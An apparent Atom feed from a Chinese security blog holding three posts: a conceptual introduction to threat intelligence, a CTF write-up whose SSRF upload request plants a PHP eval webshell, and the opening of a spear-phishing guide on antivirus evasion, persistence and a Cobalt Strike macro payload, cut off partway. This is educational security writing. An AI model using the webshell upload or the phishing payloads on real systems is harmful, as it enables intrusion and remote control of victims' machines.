      <category term="漏洞复现" scheme="http://patrilic.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Struts2" scheme="http://patrilic.top/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>初识威胁情报</title>
    <link href="http://patrilic.top/2019/08/14/%E5%88%9D%E8%AF%86%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"/>
    <id>http://patrilic.top/2019/08/14/初识威胁情报/</id>
    <published>2019-08-14T15:32:22.000Z</published>
    <updated>2019-08-20T15:30:37.034Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-08-14 23:32:22<br><img src="/wallpaper/[30679]SCENT-65089776.png" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>自从把学习重心偏向RedTeam相关之后，一直想学习关于威胁情报的东西，平时也会在<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">微步社区</a>之类的地方去看一些关于威胁的分析报告。今天晚上终于空了下来，准备好好的沉淀一下，最近发生很多事情，并且接了个项目，一直在忙，这几天就好好的沉静下来去系统认识一下这个东西</p><h2 id="0x01-相关概念"><a href="#0x01-相关概念" class="headerlink" title="0x01 相关概念"></a>0x01 相关概念</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>翻了很多文章，大多数都是认为威胁情报的定义为Gartner在2014年发表的《安全威胁情报服务市场指南》</p><blockquote><p>基于一定知识的证据，已经存在或正在形成的潜在威胁，比如，上下文、机制、指标、意义以及可实施的建议，利用这些，可以帮助当事人形成应对这些危险的决策。</p></blockquote><h3 id="the-pyramid-of-pain"><a href="#the-pyramid-of-pain" class="headerlink" title="the-pyramid-of-pain"></a>the-pyramid-of-pain</h3><p><img src="/初识威胁情报.resources/7EC24897-0F01-4B0B-A3D3-63D3E1AF2863.png" alt="8be5978252a523fd61cee3ef211d70d2"><br><strong>这个金字塔非常明显的展示了关于情报和利用的困难度对应的关系，同时也和情报的价值相关</strong></p><p>从下往上看：<br><strong>Hash Value</strong>：Hash值是一个文件的唯一凭证，类似于我们在<code>VirusTotal</code>中提交样本那串hash，但是如果文件中有一点东西被改变了，都会导致这个文件的Hash值变得不同，所以反而，一个样本的hash也是最不值得跟踪的，当然价值也最低。</p><p><strong>Ip Addresses</strong>：IP地址，如果攻击者常用的<code>Pentest Server</code>被记录下来的话，也有一定的价值，不过目前来说，绝大部分人使用C2域名来隐藏自己的攻击，同时使用CDN/代理之类的手段的来不停的变换自己的IP，来绕过跟踪。</p><p><strong>Domain Names</strong>：域名的话是现在大多数隐蔽攻击的方式，注册一个类似域名，配合使用鱼叉攻击的工具可以达到邮件钓鱼之类的目的。域名的话需要注册，备案，然后与服务器进行绑定，所以准备的东西还是比较多的。但是这种方式隐蔽攻击的效果也较好，特别是如果存在<code>Subdomain Takeover</code>这样的漏洞，效果非常的棒。但是在大型APT行动中，攻击者也会准备大量域名，所以这个的价值就显得不是特别的高了。</p><p><a href="https://www.secpulse.com/archives/94973.html" target="_blank" rel="noopener">深入解析子域名接管（Subdomain Takeover）漏洞</a></p><p><strong>Network/Host Artifacts</strong>：顾名思义，这一层是网络与主机特征，这里特征并不单单包括攻击者的各种主机信息，例如访问的特定UA头等，还包括了攻击者所获得的账号密码，例如从某一个VPN账号连接至内网，然后又从某一台出口机器走出的流量等。</p><p><strong>Tools</strong>：特定组织/单独的黑客通常会使用相同或相似的方法进行攻击，获得了使用的工具特征，就能进行针对性的免杀等，让攻击者增加成本<br><strong>TTPs</strong>：<code>Tactics、Techniques &amp; Procedures</code>，TTPs在攻击方也是最重要的，指所使用的攻击策略、手法等，了解了一个组织的TTPs，就能明白攻击者所利用的具体漏洞，然后去防御。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>这里推一波<code>@e1knot</code>师傅在Defcon Group上的演讲PPT</p><p>👉 <a href="https://www.slideshare.net/JeremyLi10/discover-advanced-threats-with-threat-intelligence-jeremy-li" target="_blank" rel="noopener">https://www.slideshare.net/JeremyLi10/discover-advanced-threats-with-threat-intelligence-jeremy-li</a></p><p>传统分类来看，威胁情报分为：</p><ol><li>战术情报</li><li>战略情报</li><li>运营情报</li></ol><p><strong>战术级情报</strong>：战术情报的作用主要是发现威胁事件以及对报警确认或优先级排序。常见的失陷检测情报（CnC 情报，即攻击者控制被害主机所使用的远程命令与控制服务器情报）、IP情报就属于这个范畴，它们都是可机读的情报，可以直接被设备使用，自动化的完成上述的安全工作。</p><p><strong>运营级情报</strong>：运营级情报是给安全分析师或者说安全事件响应人员使用的，目的是对已知的重要安全事件做分析（报警确认、攻击影响范围、攻击链以及攻击目的、技战术方法等）或者利用已知的攻击者技战术手法主动的查找攻击相关线索。</p><p><strong>战略级情报</strong>：战略层面的威胁情报是给组织的安全管理者使用的，比如CSO。它能够帮助决策者把握当前的安全态势，在安全决策上更加有理有据。包括了什么样的组织会进行攻击，攻击可能造成的危害有哪些，攻击者的战术能力和掌控的资源情况等，当然也会包括具体的攻击实例。</p><p>—————————-手动分割线——————————–</p><p>然后<code>@e1knot</code>师傅在知乎专栏中提到了另一种分类方式，在我看来这种也是更加容易理解的（赞）</p><p>👉 <a href="https://zhuanlan.zhihu.com/p/30105006" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/30105006</a></p><p>大概就是分为如下几种类型：</p><ol><li>IP/Domain 信誉类情报</li><li>网络通信流量数据</li><li>事件分类（Incident Pulse）数据</li><li>蜜罐数据</li><li>被动流量解析（Passive DNS）数据</li></ol><p>（相信各位渗透测试工作者也常常在实战中遇到蜜罐这类东西，稍不注意就会把自己常用的姿势和手段“送”给企业）</p><p><strong>IP/Domain 信誉类情报</strong>：经常逛微步社区或者用它来找过dns解析之类的师傅肯定也会发现，IP或者域名会被打上各种标签，例如：<br><img src="/初识威胁情报.resources/D934469E-34B5-428B-9F83-FB61673159EA.png" alt="34f6416ad8558f4cf07372f9484726b6"></p><p>以下平台可以供我们方便的查询到这个IP/Domaini是不是已经被列为恶意IP/Domain，或者他在某一段时间是否是被恶意攻击者攻陷等。</p><ul><li>微步在线 - <a href="https://x.threatbook.cn" target="_blank" rel="noopener">https://x.threatbook.cn</a></li><li>奇安信威胁情报中心 - <a href="https://ti.qianxin.com/" target="_blank" rel="noopener">https://ti.qianxin.com/</a></li><li>RiskIQ Community - <a href="https://community.riskiq.com" target="_blank" rel="noopener">https://community.riskiq.com</a></li></ul><p>但是由于不同的威胁平台的检测可能不同，导致结果可能有偏差等。所以相对其他的，反而成为了相对最没有价值的情报</p><p><strong>网络通信流量数据</strong>：这里指从大网上采集的数据，也就是我们俗称的外网数据。主要是看目标服务器的流量波动，比如如果在某一个端口上的流量在一段时间剧增，可能存在被入侵的风险</p><p><strong>事件分类</strong>：这里提一下两个概念：</p><ol><li>CERT：Computer emergency response team  维基百科：<a href="https://en.wikipedia.org/wiki/Computer_emergency_response_team" target="_blank" rel="noopener">wiki</a></li><li>CIRT：Critical Incident Response Team 维基百科：<a href="https://en.wikipedia.org/wiki/Critical_Incident_Response_Team" target="_blank" rel="noopener">wiki</a></li></ol><p>具体可以查看后面的维基百科链接进行了解<br>然后是事件分类大概就是，将威胁情报的基础数据进行打包分类，然后封装成一个个的事件。<br>这种情报的好处在哪里呢，一个是可以基本全面的进行威胁分析，然后提前预警。然后同时也可以更快的发现事件。<br>然后厂商经过整理后，可以通过订阅的方式进行预警，同时收取订阅费用。<br>例如：</p><ul><li>微步在线</li><li>Alienvault OTX <a href="https://otx.alienvault.com" target="_blank" rel="noopener">https://otx.alienvault.com</a></li><li>IBM X-Force Exchange <a href="https://exchange.xforce.ibmcloud.com/" target="_blank" rel="noopener">https://exchange.xforce.ibmcloud.com/</a></li></ul><p><strong>蜜罐数据</strong>：这个东西没什么好说的，就是企业部署在内网或者外网（很少）的一些看似薄弱点，引诱攻击者进行攻击，暴露自己的行为特征甚至是TTP</p><p>然后最近冰总社区里发了个挺好玩的开源蜜罐：<br>👉 <a href="https://bithack.io/forum/484" target="_blank" rel="noopener">https://bithack.io/forum/484</a></p><p><strong>被动流量解析</strong>：其实就是被动DNS（Passive DNS），也是一种比较老的技术了，但是依然很常用，特别是溯源内网恶意流量的时候..下面这几篇文章讲的很详细了～就不多讲了</p><ul><li><a href="https://securityintelligence.com/how-to-use-passive-dns-to-inform-your-incident-response/" target="_blank" rel="noopener">How to Use Passive DNS to Inform Your Incident Response</a></li><li><p><a href="https://www.deteque.com/news/passive-dns/" target="_blank" rel="noopener">What is Passive DNS? A beginner’s guide</a></p></li><li><p><a href="https://www.riskiq.com/platform/architecture/internet-data-sets/passive-dns/" target="_blank" rel="noopener">Passive DNS</a></p></li></ul><h3 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3><blockquote><p>《Market Guide for Security Threat Intelligence Service》 – Gartner . 2014</p></blockquote><p>在业界接受较广，而他认为情报是过程的产物，而非独立数据点的合集。Gartner刻画了威胁情报的生命周期：<br><img src="/初识威胁情报.resources/A574A6F6-0408-4F70-90D0-5E43D1CA3147.png" alt="b551bc79146cfd117fd9ccf5b4c04408.png"></p><ul><li>定向：定义目标并完善</li><li>收集：从多种开放或封闭的源收集数据；电子的、人工的</li><li>处理：如有需要，翻译；进行可靠性评估；核对多个源</li><li>分析：判断此信息的意义；评估信息的重要性；推荐相应措施</li><li>传递：将情报传递给客户</li><li>反馈：依照需求调整</li></ul><h3 id="意义"><a href="#意义" class="headerlink" title="意义"></a>意义</h3><p>同样也是<code>@e1knot</code>师傅文章中提到的，<strong>威胁情报在安全运营体系中的定位是——辅助发现潜在的或正在发起的恶意行为或操作，重点在于辅助两个字，威胁情报严格意义上来说只能有限的感知潜在的威胁，换句话说：如果有人现在瞄准的目标全部都是能源类客户，那么威胁情报就可以提醒没有被攻击的客户可能会遭受到该攻击者的攻击，这个叫做有限的感知潜在的威胁。</strong></p><h2 id="0x02-分析模型"><a href="#0x02-分析模型" class="headerlink" title="0x02 分析模型"></a>0x02 分析模型</h2><p><a href="https://www.slideshare.net/JeremyLi10/application-of-threat-intelligence-in-security-operation?utm_source=slideview&amp;utm_medium=ssemail&amp;utm_campaign=first_clip" target="_blank" rel="noopener">https://www.slideshare.net/JeremyLi10/application-of-threat-intelligence-in-security-operation?utm_source=slideview&amp;utm_medium=ssemail&amp;utm_campaign=first_clip</a></p><p>既然威胁情报是个辅助手段，所以，我们通过使用威胁情报进行分析，才是最主要的。<br>这里目前用的比较多的就是两大模型：</p><ol><li>Kill Chain</li><li>Diamond Model</li></ol><p>但是我觉得现在应该再加一个ATT&amp;CK矩阵，比如以最出名的<code>MITRE ATT&amp;CK</code>举例，里面基本上集合了绝大部分的入侵模型。<br>👉 <a href="https://attack.mitre.org/" target="_blank" rel="noopener">MITRE ATT&amp;CK</a></p><h3 id="Kill-Chain模型"><a href="#Kill-Chain模型" class="headerlink" title="Kill-Chain模型"></a>Kill-Chain模型</h3><p><img src="/初识威胁情报.resources/0133F529-3989-4E8B-847C-F5A3F33C1FBE.jpg" alt="fcc8b4c5429f36b191520f4c40e4dcb1.jpeg"><br>这个模型其实和<code>PTES</code>比较相似，做渗透比较多的同学应该都比较了解了</p><ul><li>侦查阶段：扫描目标IT资产和信息收集，比如说Google Hacking这些侦查类型的攻击</li><li>武器化阶段：将前一阶段发现和扫描到漏洞的信息整合到一起并制作针对性的武器（当然国内的嘛，你懂得）</li><li>部署阶段：将这些武器或者是远控RAT部署到对应的Compromised Servers上</li><li>攻击阶段：使用这些Compromised Servers和之前做好的武器化工具对目标发起攻击</li><li>后门种植阶段：安装远程控制的服务和进程</li><li>远控阶段：让目标和C&amp;C通信</li><li>后渗透阶段：收割、继续横向渗透入侵</li></ul><p>还是给一个链接：<a href="http://www.pentest-standard.org/index.php/Main_Page" target="_blank" rel="noopener">pentest-standard</a><br>PTES基本流程：</p><ul><li>Pre-engagement Interactions</li><li>Intelligence Gathering</li><li>Threat Modeling</li><li>Vulnerability Analysis</li><li>Exploitation</li><li>Post Exploitation</li><li>Reporting</li></ul><p><strong><code>Kill-Chain模型</code>基本上就是描述了攻击者的进攻路线，但是并不能明确的说明造成的影响和目的。</strong></p><h3 id="Diamond-Model模型"><a href="#Diamond-Model模型" class="headerlink" title="Diamond Model模型"></a>Diamond Model模型</h3><p>钻石模型是一个针对单个事件分析的模型，核心就是用来描述攻击者的技战术和目的，具体的钻石模型如下图所示：<br><img src="/初识威胁情报.resources/11AEE56D-E38D-48D7-B02D-D09B38AEE471.jpg" alt="4b601b6bc348f226a906ce13b3d535d0.jpeg"></p><p>钻石模型由三部分组成：置信度、元数据、社会-政治影响和技战术组合</p><p><strong>社会政治影响</strong>：处于钻石模型上下两个顶点，上顶点表示攻击者，下顶点表示受害者也就是目标。攻击者和受害者之间的某种利益冲突或者是社会地位对立则会产生攻击的意图和发起攻击的原因，纵切面表示的就是社会政治影响。说大白话就是根据这俩人去发现攻击的意图。</p><p><strong>技战术组合</strong>：技战术组合位于整个钻石模型的横切面，横切面的两个顶点分别为基础设施和技术能力，这里的基础设施和技术能力其实都是相对于攻击者而言的。</p><p><strong>元数据</strong>：这个其实就是左边列出来的，攻击时间、攻击阶段、攻击结果、攻击方向、攻击手段、攻击资源利用。</p><p><strong>置信度</strong>：也就是以上你分析出结果的可信程度。</p><p>钻石模型想要表达的其实就是针对单个安全事件，我们可以得到攻击者为什么想要攻击目标，打算用什么手段去攻击目标。</p><h3 id="Kill-Chain-Diamond-Model"><a href="#Kill-Chain-Diamond-Model" class="headerlink" title="Kill-Chain + Diamond Model"></a>Kill-Chain + Diamond Model</h3><p>直接举个例子<code>@e1knot</code>师傅给的例子：</p><p>复杂的攻击往往都是有一系列的攻击事件组成的，不同的攻击事件指向的目标和达到的目的可以表示出攻击的进程，那么OK，我们如果把事件按照Kill-Chain进行分类同时使用泳道图进行表示，同时把不同的攻击路线分为不同的攻击线程，那么我们就可以得到一个这样的泳道图。<br><img src="/初识威胁情报.resources/84FF0AAE-65B8-43D4-8BB2-F5E6A1E8A614.jpg" alt="b9baf610a02307c8c0c3d905bc9b497c.jpeg"><br>其实这张图描述的是这么一个事件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.攻击者先对目标进行了Google Hacking操作，获得了他们域名解析记录等一些基础的It信息</span><br><span class="line">2.攻击者找到了一个目标新注册的域名，然后用搜索引擎搜索他们的网络管理员的电子邮件信息</span><br><span class="line">3.攻击者使用鱼叉邮件方式对目标的网络管理员发送一封带有木马的邮件</span><br><span class="line">4.目标的网管（我们叫他网管一号）打开了这封邮件的附件然后不幸中枪</span><br><span class="line">5.网管一号的主机因为中了病毒，所以攻击者利用网管一号这台主机发送了一个HTTP Post请求到域控节点，然后域控节点返回了一个HTTP Response</span><br><span class="line">6.我们通过对鱼叉邮件中附件进行逆向分析发现里面有两个IP地址，第二个IP地址作为备份，防止第一个失效</span><br><span class="line">7.通过C&amp;C请求到网管一号的主机，我们的恶意程序打开了一个TCP代理服务</span><br><span class="line">8.通过网管一号主机上的代理服务，攻击者继续去Google上搜索其他的目标</span><br><span class="line">9.攻击者检查网管一号邮件的通信录列表去寻找是否拥有目标二号的通讯方式，结果发现了目标二号的首席科学家的联系方式</span><br><span class="line">10.攻击者使用攻陷的网管一号的邮箱对目标二号的首席科学家的邮箱发起鱼叉邮件攻击，工具使用和之前一样的</span><br><span class="line">11.此时又来了一个攻击者，我们称他为攻击者二号，攻击者一号扫描了目标三号的web服务器</span><br><span class="line">12.使用同样的漏洞利用工具攻击发现目标三号主机上的相同的漏洞</span><br><span class="line">13.被攻陷的目标三号主机返回一个shell会话给攻击者三号</span><br><span class="line">14.目标三号的所有数据被攻击者三号窃取</span><br></pre></td></tr></table></figure></p><p>这样的话使用Kill-Chain和钻石模型分析可以同时get到攻击者的点和想要攻击的目标，同时还知道了他的攻击路径，也就是说这时候我们对攻击者了如指掌了。</p><h3 id="ATT-amp-CK-Matrix-for-Enterprise"><a href="#ATT-amp-CK-Matrix-for-Enterprise" class="headerlink" title="ATT&amp;CK Matrix for Enterprise"></a>ATT&amp;CK Matrix for Enterprise</h3><p>这个是我自己加上去的，同时也是平时去了解红队TTP的好地方<br><img src="/初识威胁情报.resources/1223BE32-9B48-4504-8164-6F1625D130B3.png" alt="2425d00398a387cd6532219f91303fa9"></p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>学习上面的知识也有一点自己的想法，威胁情报作为态势感知的一种，不仅能够让企业针对性的进行防御，同时也能够让运营看到自己的一些盲点，能够跟好的进行企业安全建设相关的方面（说到这里也不得不赞叹谷歌的0信任，真的太牛逼了)，威胁情报能做的事情还是很多的，我自己整理之后觉得有以下几个方向：</p><pre><code>1. 企业安全建设相关2. 学习运营盲点3. 溯源攻击4. 全球共享情报，增加入侵成本5. 学习新的攻击手段，收集0day（蜜罐）6. ……</code></pre><p>最后，e1knot师傅tql</p><h2 id="0x04-链接"><a href="#0x04-链接" class="headerlink" title="0x04 链接"></a>0x04 链接</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247484237&amp;idx=1&amp;sn=a02b4576bac88de4089a259d3da3ccb9&amp;chksm=ec6fe44ddb186d5b57eb61af95a7edbf24d4012fa640a9382e2e99f236f0215f2b3953658297&amp;scene=38#wechat_redirect" target="_blank" rel="noopener">使用威胁情报调查攻击者</a></p><p><a href="https://zhuanlan.zhihu.com/p/30160133" target="_blank" rel="noopener">使用威胁情报追踪攻击者——Part 2 高级威胁事件分析与防御矩阵</a></p><p><a href="https://www.xmanblog.net/threat-intelligence/" target="_blank" rel="noopener">浅析威胁情报</a><br><a href="https://xz.aliyun.com/t/1814" target="_blank" rel="noopener">浅谈高级威胁情报对于安全建设的意义与思考（上）—攻击者情报那些不得不说的事儿</a><br><a href="https://xz.aliyun.com/t/1928" target="_blank" rel="noopener">浅谈高级威胁情报对于安全建设的意义与思考（中）—基础设施情报那些不得不说的事儿</a><br><a href="https://xz.aliyun.com/t/1935" target="_blank" rel="noopener">浅谈高级威胁情报对于安全建设的意义与思考（下）—事件情报那些不得不说的事儿</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-08-14 23:32:22&lt;br&gt;&lt;img src=&quot;/wallpaper/[30679]SCENT-65089776.png&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h
      
    
    </summary>
    
      <category term="Threat Intelligence" scheme="http://patrilic.top/categories/Threat-Intelligence/"/>
    
    
      <category term="威胁情报" scheme="http://patrilic.top/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>CISCN 2019 Final Web11 赛后复盘</title>
    <link href="http://patrilic.top/2019/07/28/CISCN%202019%20Final%20Web11/"/>
    <id>http://patrilic.top/2019/07/28/CISCN 2019 Final Web11/</id>
    <published>2019-07-28T07:08:02.000Z</published>
    <updated>2019-08-20T15:26:59.716Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-07-18 11:20:33<br><img src="/wallpaper/[41576]「　ねぇ、」-64710934.jpg" alt><br>比赛的时候熬了一万年，只看到了一个本地请求，都不知道这个ssrf怎么利用，哎，还是要好好学逆向(吐血)</p></blockquote><h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><p>题目链接：<a href="http://web65.buuoj.cn/" target="_blank" rel="noopener">http://web65.buuoj.cn/</a> (推一手北联合师傅的平台)<br>题目源码：<a href="https://github.com/imagemlt/CISCN_2019_final_pmarkdown.git" target="_blank" rel="noopener">https://github.com/imagemlt/CISCN_2019_final_pmarkdown.git</a></p><h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><p>上传文件显示只能localhost上传，并且使用$SERVER[‘Remote-addr’]来获取ip<br>感觉只能采用ssrf之类的方式去上传文件，但是一直没get到点</p><p><a href="http://web65.buuoj.cn/index.php?act=post&amp;md=readme.md" target="_blank" rel="noopener">http://web65.buuoj.cn/index.php?act=post&amp;md=readme.md</a><br>md参数存在任意文件读取，可以利用php伪协议读源码<br><img src="/CISCN 2019 Final Web11.resources/D3CBF586-E936-4124-93C5-A89366265174.png" alt="7d9e6b80be391556be25e272dcb649f8"></p><p>然而并没有什么用，比赛的时候就一直卡在这里。<br>一直在想怎么去绕过，然后比赛给了提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. SSRF</span><br><span class="line">2. .htaccess</span><br></pre></td></tr></table></figure></p><p>.htaccess可以看到他让.md格式解析成了php<br><img src="/CISCN 2019 Final Web11.resources/7D9338F3-6F65-468B-9691-352B58498516.png" alt="25da9c8a3e1d8a088353b5d55747884a"></p><p>但是ssrf又怎么去看呢，源码里肯定没有，问题应该出在.so文件里<br>post.php里调用了 <strong>pmark_include()</strong> 函数<br><img src="/CISCN 2019 Final Web11.resources/58BBF5BD-2025-44D1-971A-B1F7AFADA63E.png" alt="7f5b593808f423764660307f15744e2a"></p><p>而在readme.md里是能把so文件下下来的<br>打开IDA分析一波</p><p>sub_1850里存在一个Http包，会以127.0.0.1的身份去request<br><img src="/CISCN 2019 Final Web11.resources/3472965F-EB2A-4FBC-9ACF-6D3D2D6DFB49.png" alt="0bb9f4775d2531e018e23f72e2803950"></p><p>往上找调用<br><img src="/CISCN 2019 Final Web11.resources/96DC7631-995E-46AB-B7FF-157D53503E90.png" alt="53e4cf1d179c5eb62ff8d33bc810f35d"><br><img src="/CISCN 2019 Final Web11.resources/3A9A08B0-404E-4783-BE8A-AFF0428FB826.png" alt="361977c811b801c48c5a73dd4e2c51a8"><br><img src="/CISCN 2019 Final Web11.resources/7774A215-1CC3-4998-AAA6-552A05DD86E4.png" alt="33f0b7885e41503a3a65a1ec8ddb08f2"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int zend_hash_find ( HashTable* ht, char* arKey, uint nKeyLength, void** pData )</span><br></pre></td></tr></table></figure></p><p>v15: debug</p><p>参数为debug,利用ssrf上传即可</p><p>所以可以直接构造payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh,en-US;q=0.7,en;q=0.3</span><br><span class="line">Referer: http://127.0.0.1:8080/index.php?act=upload</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------6693638881479522630623693797</span><br><span class="line">Content-Length: 244</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------6693638881479522630623693797</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.php&quot;</span><br><span class="line">Content-Type: text/php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">eval($_REQUEST[a]);</span><br><span class="line"></span><br><span class="line">-----------------------------6693638881479522630623693797--</span><br></pre></td></tr></table></figure></p><p>利用popen()绕过disabled_function<br><img src="/CISCN 2019 Final Web11.resources/94B8FADA-439F-4570-AFFB-44DF3A46FF86.png" alt="6107013d4772477cccc8e3fa7092f23b"></p><p><img src="/CISCN 2019 Final Web11.resources/F8097A0E-B573-4829-845E-0430F080DEB4.png" alt="ae389cb740da2a425e80d4d3a9b8d851"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-07-18 11:20:33&lt;br&gt;&lt;img src=&quot;/wallpaper/[41576]「　ねぇ、」-64710934.jpg&quot; alt&gt;&lt;br&gt;比赛的时候熬了一万年，只看到了一
      
    
    </summary>
    
      <category term="Write-up" scheme="http://patrilic.top/categories/Write-up/"/>
    
    
      <category term="CTF" scheme="http://patrilic.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Phishing Attack - 文件落地</title>
    <link href="http://patrilic.top/2019/07/18/Phishing%20Attack%20-%20%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0/"/>
    <id>http://patrilic.top/2019/07/18/Phishing Attack - 文件落地/</id>
    <published>2019-07-18T03:20:33.000Z</published>
    <updated>2019-08-20T15:27:23.041Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-07-18 11:20:33<br><img src="/wallpaper/[39567]Good Morning-54191467.png" alt><br>[toc]<br>鱼叉攻击，作为一种常见的攻击形式，中心思想就是将shellcode以各种形式进行伪装，然后诱使受害者启动程序，利用C2服务器进行远程命令执行</p></blockquote><p>鱼叉攻击的难点：</p><ol><li>信任伪造 – 常见的有swaks伪造邮件，DNS劫持，改写被信任网站等</li><li>免杀 – 能规避市面上大多数杀毒软件，不被发现</li><li>维持进程 – 长期控制，，开机自启</li><li>不暴露 – 不落地，依附进程，certutil等</li></ol><p>本文意在总结一些较为常见的利用方式，不是很注重文笔，看看就好，一些脚本是直接copy大手子<code>@3gstudent</code>师傅的，然后关于类似与<code>CobaltStrike</code>的Spear phish以及Nginx的玩法，单独进行总结</p><h2 id="0x00-Office"><a href="#0x00-Office" class="headerlink" title="0x00 Office"></a>0x00 Office</h2><h3 id="Office-Macro"><a href="#Office-Macro" class="headerlink" title="Office Macro"></a>Office Macro</h3><p>Office文档内置宏，可利用VB远程命令执行回弹到C2服务器<br>👇由CobaltStrike生成的Macro病毒样本<br><img src="/Phishing Attack - 文件落地.resources/6A9FD69F-ED50-4060-93AA-726501F481E2.png" alt="0ea9ced974025abd297e31f79a2624bb"></p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Private</span> Type PROCESS_INFORMATION</span><br><span class="line">    hProcess <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    hThread <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwProcessId <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwThreadId <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line"><span class="keyword">End</span> Type</span><br><span class="line"></span><br><span class="line"><span class="keyword">Private</span> Type STARTUPINFO</span><br><span class="line">    cb <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    lpReserved <span class="keyword">As</span> <span class="built_in">String</span></span><br><span class="line">    lpDesktop <span class="keyword">As</span> <span 